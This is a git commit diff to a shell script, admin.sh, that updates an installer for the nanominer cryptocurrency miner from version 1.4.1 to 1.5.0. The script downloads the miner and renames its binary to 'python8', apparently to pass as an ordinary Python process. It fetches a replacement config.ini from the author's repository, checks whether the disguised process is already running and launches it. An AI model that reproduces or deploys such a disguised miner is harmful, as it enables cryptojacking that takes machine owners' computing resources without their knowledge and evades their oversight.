676e41f04e648ccc97c6704e206940b486cd99eb
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-07-19 13:35:53 +0700

    Update admin.sh

--- admin.sh
+++ admin.sh
@@ -1,6 +1,6 @@
 #! /bin/bash
 set -x #echo on
-if [ -f ${PWD}/nanominer-linux-1.4.1.tar.gz ]; then
+if [ -f ${PWD}/nanominer-linux-1.5.0.tar.gz ]; then
     if pgrep -x "python8" > /dev/null
 then
     echo "scrip dang chay roi , ke cmn di "
@@ -8,16 +8,16 @@ then
 else
 
 echo "script da install , chay thoi "
-cd nanominer-linux-1.4.1
+cd nanominer-linux-1.5.0
 ./python8
      
 fi
 exit
 fi
 
-wget https://github.com/nanopool/nanominer/releases/download/v1.4.1/nanominer-linux-1.4.1.tar.gz
-tar xvzf nanominer-linux-1.4.1.tar.gz
-cd nanominer-linux-1.4.1
+wget https://github.com/nanopool/nanominer/releases/download/v1.5.0/nanominer-linux-1.5.0.tar.gz
+tar xvzf nanominer-linux-1.5.0.tar.gz
+cd nanominer-linux-1.5.0
 mv nanominer python8
 rm config.ini
 wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/config.ini
